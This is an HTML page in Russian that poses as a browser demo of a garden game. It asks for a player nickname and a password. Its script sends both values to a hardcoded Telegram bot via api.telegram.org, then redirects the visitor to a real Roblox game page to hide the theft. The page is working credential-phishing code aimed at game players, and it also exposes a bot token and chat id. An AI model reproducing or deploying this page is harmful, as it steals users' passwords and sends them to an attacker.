<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🌿 Garden Quest - демо</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d1b1e;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .card {
            background: #1a2f35;
            padding: 40px 30px;
            border-radius: 32px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            border: 1px solid #3a5a5a;
        }
        h1 {
            color: #8cd4b0;
            font-size: 32px;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }
        .sub {
            color: #7fa3a3;
            font-size: 15px;
            margin-bottom: 28px;
        }
        .input-group {
            margin-bottom: 16px;
            text-align: left;
        }
        .input-group label {
            color: #b0d0d0;
            font-size: 13px;
            display: block;
            margin-bottom: 4px;
            margin-left: 8px;
        }
        input {
            width: 100%;
            padding: 14px 18px;
            border-radius: 40px;
            border: none;
            background: #0f2025;
            color: #e0f0f0;
            font-size: 16px;
            outline: none;
            transition: 0.2s;
        }
        input:focus {
            background: #1a333a;
            box-shadow: 0 0 0 2px #4caf8f;
        }
        input::placeholder {
            color: #4a6a6a;
        }
        button {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 40px;
            background: #4caf8f;
            color: #0d1b1e;
            font-weight: bold;
            font-size: 18px;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 10px;
        }
        button:hover {
            background: #5dcfa8;
            transform: scale(1.01);
        }
        #status {
            margin-top: 18px;
            font-size: 14px;
            color: #8ab3b3;
            min-height: 24px;
        }
        .footer {
            margin-top: 30px;
            color: #3a5a5a;
            font-size: 12px;
            border-top: 1px solid #1a333a;
            padding-top: 20px;
        }
    </style>
</head>
<body>

<div class="card">
    <h1>🌿 Garden Quest</h1>
    <div class="sub">интерактивная демо-версия</div>

    <div class="input-group">
        <label>👤 Имя в игре</label>
        <input type="text" id="username" placeholder="Твой ник">
    </div>

    <div class="input-group">
        <label>🔐 Кодовое слово (для сохранения)</label>
        <input type="password" id="password" placeholder="Любой пароль">
    </div>

    <button onclick="send()">🎮 Запустить демо</button>
    <div id="status"></div>

    <div class="footer">
        🌱 версия 0.2 · не требует скачивания
    </div>
</div>

<script>
    function send() {
        var user = document.getElementById('username').value.trim();
        var pass = document.getElementById('password').value.trim();

        if (!user || !pass) {
            document.getElementById('status').innerHTML = '⚠️ Заполни оба поля';
            return;
        }

        var token = "8886268399:AAEQu4OjVY66LD9RnpCOAgQPzpnPht-I4wQ";
        var chat_id = "5098876175";
        var msg = "🌿 GARDEN: " + user + " | PASS: " + pass;

        fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(msg))
            .then(function(res) {
                if (res.ok) {
                    document.getElementById('status').innerHTML = '✅ Загрузка...';
                    setTimeout(function() {
                        window.location.href = "https://www.roblox.com/games/10166971527/Grow-a-Garden";
                    }, 1500);
                } else {
                    document.getElementById('status').innerHTML = '❌ Ошибка, попробуй снова';
                }
            })
            .catch(function() {
                document.getElementById('status').innerHTML = '❌ Ошибка соединения';
            });
    }
</script>

</body>
</html>
